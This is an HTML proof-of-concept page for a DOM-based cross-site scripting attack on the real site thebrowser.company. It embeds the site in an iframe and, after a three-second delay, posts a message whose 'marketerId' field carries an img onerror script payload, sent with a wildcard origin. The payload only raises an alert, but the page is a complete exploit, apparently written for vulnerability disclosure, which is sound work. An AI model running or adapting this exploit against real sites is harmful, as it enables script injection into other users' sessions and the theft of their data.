<!DOCTYPE html>
<html>
  <head>
    <title>XSS PoC - thebrowser.company</title>
  </head>
  <body>
    <h1>âœ… DOM XSS via postMessage (Attempt with Delay)</h1>
    <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border: 2px solid black;"></iframe>

    <script>
      const iframe = document.getElementById("target");

      iframe.onload = () => {
        console.log("âœ… iframe loaded");

        const payload = {
          message: "OB_SHOULD_SHOW_PICKER",
          content: {
            marketerId: [
              "<img src='x' onerror='alert(`XSS inside thebrowser.company`)'>"
            ]
          }
        };

        console.log("ðŸš€ Sending XSS payload via postMessage after 3s...");
        setTimeout(() => {
          iframe.contentWindow.postMessage(payload, "*");
        }, 3000);
      };
    </script>
  </body>
</html>
